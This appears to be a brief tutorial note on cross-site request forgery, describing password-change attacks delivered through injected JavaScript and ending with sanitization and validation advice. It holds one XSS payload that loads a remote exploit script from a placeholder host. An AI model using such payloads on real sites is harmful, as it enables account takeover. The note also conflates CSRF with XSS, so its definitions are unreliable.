# Cross-Site Request Forgery(CSRF)
CSRF is caused by unfiltered user input. CSRF attacks may utilize XSS vulnerabilities to perform certain queries, and **API** calls on a web application that victim is currently authenticated to. This would allow attacker to perform actions as the authenticated user. It may utilize other vulnerabilities to perform the same functions like utilizing HTTP parameters for attacks.

A common CSRF attack to gain higher privileged access to a web application is to craft a **JavaScript** payload that automatically change's the victim's password to the value set by the attacker. Once the victim views the payload on the vulnerable page  (e.g. malicious comment containing the **JavaScript CSRF** payload), the **JavaScript** code would execute automatically. It would use the victim's logged-in session to change their password.
Once that is done , an attacker can login victim's account and control it.

**CSRF** can also be leveraged to attacks admins and gain access to their accounts. Admins usually have access to sensitive functions, which can sometimes be used to gain control over the back-end-server(depending on the functionality provided to admins within given web application). Following this example instead of using **JavaScript** code that would return session cookie, we would load a remote **.js (JavaScript)** file as follows:
```html
"><script src=//www.example.com/exploit.js></script>
```
The exploit.js file would contain the malicious JavaScript code that changes the user's password. Developing the exploit.js requires the knowledge of this web application's password changing procedure and **APIs**. The attacker would need to create JavaScript code that replicate desired functionality and automatically carry it out;

## Prevention
Two main controls must be applied when accepting user interface :

||
--|--|
**Type | Description**
**Sanitization** | Removing special characters and non standard characters from users input before displaying it or storing it.
**Validation** | Ensuring that submitted user input matches expected format(e.g. wsubmitted email matches email format).




